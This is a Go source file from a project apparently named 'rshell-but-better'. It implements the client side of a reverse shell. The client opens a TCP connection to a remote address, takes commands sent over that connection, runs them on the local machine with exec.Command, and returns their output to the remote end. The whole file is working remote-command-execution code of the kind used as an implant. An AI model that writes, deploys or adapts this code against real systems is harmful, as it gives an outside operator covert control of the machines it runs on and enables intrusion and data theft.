package client

import (
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/ShubhamVG/rshell-but-better/internal/network"
)

// ============================Exportables==========================

type Client struct {
	Conn net.Conn
}

// Not sure if this is a good idea
func NewClient(addr, port string) (Client, error) {
	addrWithPort := addr + ":" + port
	conn, err := net.Dial("tcp", addrWithPort)

	return Client{Conn: conn}, err
}

func (client *Client) Communicate() {
	defer client.tryNotifyAndClose()
	client.Conn.SetReadDeadline(time.Time{})
	go client.handleReceives()

	// Prevents the process from exiting right away
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sig
}

// ==============================Internals============================

func (client *Client) handleReceives() {
	buffer := make([]byte, 1024)

	for {
		n, err := client.Conn.Read(buffer)

		switch err {
		case net.ErrClosed:
			client.tryNotifyAndClose()
		}

		receivedReq := network.ParseIntoRequest(buffer[:n])
		client.processRequestAndSendResponse(receivedReq)
	}
}

func (client *Client) processRequestAndSendResponse(req network.Request) {
	switch req.Status {
	case network.PING:
		// TODO
	case network.REQUESTING_CLOSE:
		os.Exit(0)
	case network.EXECUTE:
		rawCommand := strings.TrimSuffix(req.Payload, "\n")
		command, params := parseIntoCommandAndParams(rawCommand)
		out, err := exec.Command(command, params...).Output()
		statusCode := network.OUTPUT

		if err != nil {
			statusCode = network.OUTPUT_WITH_ERROR
		}

		if err := client.send(statusCode, out); err != nil {
			client.tryNotifyAndClose()
		}
	}
}

func (client *Client) send(
	statusCode network.StatusCode,
	bytes []byte,
) error {
	payload := []byte{statusCode}
	payload = append(payload, bytes...)
	client.Conn.SetWriteDeadline(time.Now().Add(writeTimeLimit))
	if _, err := client.Conn.Write(payload); err != nil {
		return err
	}

	return nil
}

func (client *Client) tryNotifyAndClose() {
	client.Conn.Write([]byte{network.REQUESTING_CLOSE})
	os.Exit(0)
}
